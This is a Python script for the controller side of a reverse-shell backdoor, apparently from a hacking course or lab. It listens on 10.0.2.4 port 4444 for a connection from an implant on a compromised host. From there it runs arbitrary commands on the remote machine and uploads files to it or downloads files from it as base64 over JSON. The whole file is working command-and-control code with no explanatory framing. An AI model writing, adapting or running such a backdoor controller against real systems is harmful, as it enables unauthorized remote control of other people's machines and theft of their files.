#!/usr/bin/env python

import socket
import json
import base64
import os


class Listener:
    def __init__(self, host, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((host, port))
        self.listener.listen(0)
        print("Listening for incoming connections...")
        self.connection, self.address = self.listener.accept()
        print(f"Connection accepted from {self.address}")

    def reliable_send(self, data):
        """Send JSON-encoded data reliably."""
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def reliable_receive(self):
        """Receive and decode JSON data reliably."""
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue  # Wait until full JSON data is received

    def execute_remotely(self, command):
        """Send a command to the backdoor and handle the response."""
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            print("[+] Connection closed.")
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        """Write the received content to a file."""
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
            return f"[+] File '{path}' downloaded successfully."
        except Exception as e:
            return f"[-] Error saving file: {e}"

    def read_file(self, path):
        """Read a file's content in binary mode and encode it to Base64."""
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except Exception as e:
            print(f"[-] Error reading file: {e}")
            return None

    def run(self):
        """Main loop to execute commands and handle uploads/downloads."""
        while True:
            command = input(">> ").strip().split(" ", 1)
            if len(command) == 0:
                continue  # Skip empty commands

            if command[0] == "upload" and len(command) > 1:
                local_path = command[1]
                file_content = self.read_file(local_path)
                if file_content:
                    self.execute_remotely(["upload", os.path.basename(local_path), file_content])
                    print("[+] Upload successful.")
                else:
                    print(f"[-] Failed to upload '{local_path}'.")
            else:
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    print(self.write_file(command[1], result))
                else:
                    print(result)


my_listener = Listener("10.0.2.4", 4444)
my_listener.run()
